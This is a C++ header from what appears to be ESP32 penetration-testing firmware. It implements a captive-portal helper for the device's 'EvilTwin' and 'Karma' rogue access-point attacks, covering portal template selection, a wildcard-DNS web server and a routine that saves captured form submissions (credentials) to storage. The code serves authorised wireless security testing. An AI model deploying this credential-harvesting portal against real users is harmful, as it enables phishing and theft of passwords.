#pragma once

#include <ESPAsyncWebServer.h>
#include <WiFi.h>
#include "core/Device.h"
#include "core/IStorage.h"
#include "ui/actions/InputSelectAction.h"
#include "ui/actions/ShowStatusAction.h"
#include "utils/StorageUtil.h"
#include "utils/network/SharedWebServer.h"

// Captive-portal helper used by EvilTwin, Karma, and AP screens.
// Handles portal selection, HTML loading, DNS, credential capture.
// HTTP serving is delegated to SharedWebServer (port 80).
class CaptivePortalServer {
public:
  using VisitCallback = SharedWebServer::VisitCb;
  using PostCallback  = SharedWebServer::PostCb;

  void setCallbacks(VisitCallback onVisit, PostCallback onPost, void* ctx) {
    _onVisit = onVisit;
    _onPost  = onPost;
    _ctx     = ctx;
  }

  // ── Portal Selection ─────────────────────────────────────────────────────

  bool selectPortal() {
    if (!Uni.Storage || !Uni.Storage->isAvailable()) {
      ShowStatusAction::show("No storage available");
      return false;
    }
    IStorage::DirEntry entries[MAX_PORTALS];
    uint8_t count = Uni.Storage->listDir(PORTALS_DIR, entries, MAX_PORTALS);

    InputSelectAction::Option opts[MAX_PORTALS];
    int optCount = 0;
    for (uint8_t i = 0; i < count && optCount < MAX_PORTALS; i++) {
      if (!entries[i].isDir) continue;
      _portalNamesBuf[optCount] = entries[i].name;
      opts[optCount] = {_portalNamesBuf[optCount].c_str(),
                        _portalNamesBuf[optCount].c_str()};
      optCount++;
    }
    if (optCount == 0) {
      ShowStatusAction::show("No portals found. WiFi > Network > Download > Firmware Sample Files");
      return false;
    }
    const char* selected = InputSelectAction::popup("Captive Portal", opts, optCount);
    if (!selected) return false;
    _portalFolder = selected;
    return true;
  }

  const String& portalFolder()                      const { return _portalFolder; }
  void          setPortalFolder(const String& folder)     { _portalFolder = folder; }

  // ── Portal HTML Loading ──────────────────────────────────────────────────

  void loadPortalHtml() {
    _portalBasePath = "";
    _portalHtml     = "";
    _successHtml    = "";
    if (_portalFolder.isEmpty() || !Uni.Storage || !Uni.Storage->isAvailable()) return;

    _portalBasePath = String(PORTALS_DIR) + "/" + _portalFolder;

    String indexPath = _portalBasePath + "/index.htm";
    if (!Uni.Storage->exists(indexPath.c_str())) {
      indexPath = _portalBasePath + "/index.html";
      if (!Uni.Storage->exists(indexPath.c_str())) { _portalBasePath = ""; return; }
    }
    _portalHtml = Uni.Storage->readFile(indexPath.c_str());

    String successPath = _portalBasePath + "/success.htm";
    _successHtml = Uni.Storage->exists(successPath.c_str())
                   ? Uni.Storage->readFile(successPath.c_str())
                   : "<html><body><h2>Connected!</h2></body></html>";
  }

  const String& portalHtml()  const { return _portalHtml; }
  const String& successHtml() const { return _successHtml; }

  // ── Web Server ───────────────────────────────────────────────────────────

  // Configure SharedWebServer with this portal's content and start captive.
  // Returns the shared AsyncWebServer* so callers can add extra routes
  // (e.g. /status for password checking, /captives for credential listing).
  AsyncWebServer* start(IPAddress apIP) {
    Uni.Server.setCaptiveContent(_portalHtml, _successHtml, _portalBasePath);
    Uni.Server.setCaptiveCallbacks(_onVisit, _onPost, _ctx);
    Uni.Server.enableCaptive(apIP);
    return Uni.Server.server();
  }

  void stop()  { Uni.Server.disableCaptive(); }

  // stop() + clear stored HTML so memory is freed after the attack ends.
  void reset() {
    Uni.Server.resetCaptive();
    _portalHtml     = "";
    _successHtml    = "";
    _portalBasePath = "";
  }

  // Call every frame while running to process DNS wildcard responses.
  void processDns() { Uni.Server.processDns(); }

  AsyncWebServer* server() { return Uni.Server.server(); }

  int visitCount() const { return Uni.Server.visitCount(); }
  int postCount()  const { return Uni.Server.postCount(); }

  // ── Credential Saving ────────────────────────────────────────────────────

  void saveCaptured(const String& data, const String& identifier) {
    if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
    if (!StorageUtil::hasSpace()) return;
    Uni.Storage->makeDir("/unigeek/wifi/captives");
    String filename = "/unigeek/wifi/captives/" + identifier + ".txt";
    fs::File f = Uni.Storage->open(filename.c_str(), FILE_APPEND);
    if (f) {
      f.println("---");
      f.println(data);
      f.close();
    }
  }

private:
  static constexpr const char* PORTALS_DIR = "/unigeek/web/portals";
  static constexpr int         MAX_PORTALS = 10;

  String _portalFolder;
  String _portalBasePath;
  String _portalHtml;
  String _successHtml;
  String _portalNamesBuf[MAX_PORTALS];

  VisitCallback _onVisit = nullptr;
  PostCallback  _onPost  = nullptr;
  void*         _ctx     = nullptr;
};
